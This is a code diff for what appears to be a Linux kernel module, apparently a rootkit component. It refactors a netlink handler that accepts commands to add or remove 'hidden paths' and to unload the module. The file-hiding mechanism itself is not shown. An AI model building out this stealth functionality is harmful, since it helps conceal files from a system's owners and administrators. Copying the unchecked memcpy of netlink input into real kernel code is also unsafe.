@@ -1,14 +1,10 @@
-#include <net/sock.h>
-#include <linux/netlink.h>
-#include <linux/skbuff.h>
+#include "communicate.h"
 
-#include "../operations_ids.h"
+#include "../operations_protocol.h"
 #include "../msg_to_module.h"
 #include "../msg_to_user.h"
-//#include "communicate.h"
-#include "chars_trie.h"
 
-struct trie *trie = NULL;
+#include "hidden_files_trie.h"
 
 extern void exit_my_module(void);
 
@@ -24,26 +20,24 @@ void my_recv_msg(struct sk_buff *skb) {
     int sender_pid = nlh->nlmsg_pid; /* pid of sending process_access */
     char *netlink_data = (char *) nlmsg_data(nlh);
 
-    // todo can probably just get the whole struct at once
-    OPER_ID oper_id = *((OPER_ID *) netlink_data);
-    char oper_data[MAX_MSG_SIZE];
-    memset(oper_data, '\x00', MAX_MSG_SIZE);
-    memcpy((void *) oper_data, (void *) (netlink_data + sizeof(OPER_ID)), MAX_MSG_SIZE);
+    struct msg_to_module msg;
+    memset((void*) &msg, '\x00', sizeof(struct msg_to_module));
+    memcpy((void*) &msg, netlink_data, sizeof(struct msg_to_module));
 
-    switch (oper_id) {
+    switch (msg.id) {
         case OPER_EXIT_MODULE: {
             exit_my_module();
             return;
         }
         case OPER_ADD_HIDDEN_PATH: {
-            add_word(trie, oper_data);
+            add_word(trie, msg.data);
             printk(KERN_INFO
-            "add hidden path: %s\n", oper_data);
+            "add hidden path: %s\n", msg.data);
             break;
         }
         case OPER_REMOVE_HIDDEN_PATH: {
             printk(KERN_INFO
-            "remove hidden path: %s\n", oper_data);
+            "remove hidden path: %s\n", msg.data);
             break;
         }
     }
